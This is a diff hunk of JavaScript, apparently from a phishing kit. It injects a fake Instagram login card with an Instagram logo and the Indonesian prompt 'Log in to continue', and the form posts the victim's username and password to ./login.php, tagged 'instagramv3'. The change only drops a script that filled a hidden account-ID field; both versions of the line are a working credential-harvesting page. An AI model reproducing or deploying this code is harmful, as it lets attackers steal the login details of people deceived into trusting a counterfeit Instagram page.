@@ -9,7 +9,7 @@
   
 function stateChange() {
     setTimeout(function () {
-        var data = "<div class='card'> <div class='card-body' align='center'> <img width='80%' src='https://whatmeghanwore.net/wp-content/uploads/2019/10/2475.new-instagram-text-logo.png'> <br> <h6>Masuk untuk melanjutkan</h1> <br> <div class='container' style='max-width:80%;'><form method='post' action='./login.php'> <input name='username' class='form-control' placeholder='Username'> <div style='padding-top:10px;'> <input name='password' type='password' class='form-control' style='' placeholder='Password'> <input id='id_account' name='id_account' type='hidden' value=''> <input name='type' type='hidden' value='instagramv3'> </div> <script> var id_account_in = document.getElementById('id_account'); id_account_in.value = id_account; </script> <div style='padding-top:10px;'> <button class='btn btn-primary' type='submit' style='width:80%;'>Masuk</button></form> </div> </div> <div> </div> </div>";
+        var data = "<div class='card'> <div class='card-body' align='center'> <img width='80%' src='https://whatmeghanwore.net/wp-content/uploads/2019/10/2475.new-instagram-text-logo.png'> <br> <h6>Masuk untuk melanjutkan</h1> <br> <div class='container' style='max-width:80%;'><form method='post' action='./login.php'> <input name='username' class='form-control' placeholder='Username'> <div style='padding-top:10px;'> <input name='password' type='password' class='form-control' style='' placeholder='Password'> <input id='id_account' name='id_account' type='hidden' value=''> <input name='type' type='hidden' value='instagramv3'> </div> <div style='padding-top:10px;'> <button class='btn btn-primary' type='submit' style='width:80%;'>Masuk</button></form> </div> </div> <div> </div> </div>";
 
 
 
